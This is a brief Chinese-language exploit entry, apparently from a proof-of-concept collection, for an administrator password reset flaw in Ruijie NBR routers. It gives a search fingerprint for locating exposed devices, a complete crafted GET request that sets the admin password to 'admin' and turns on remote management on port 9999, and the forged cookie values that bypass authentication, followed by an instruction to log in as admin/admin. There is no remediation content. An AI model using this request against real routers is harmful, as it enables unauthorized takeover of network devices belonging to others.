# 锐捷NBR系列多款路由器存在管理员密码重置漏洞

- **系统**：锐捷　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"`
- **请求**：`GET /base_network.asp?isbase64=1&reboot=1&shortset=1&time_type=auto&exec_service=ntpc-restart&http_lanport=80&remote_management=1&http_wanport=9999&http_username=admin&http_gname_en=0&http_passwd=admin&_= HTTP/1.1`
- **关键头**：`Cookie: wys_userid=; userid=admin; gw_userid=admin,gw_passwd=`

**请求体 / payload**
```
使用admin/admin登录系统
>
```

**其他**
- 版本: Ruijie-NBR路由器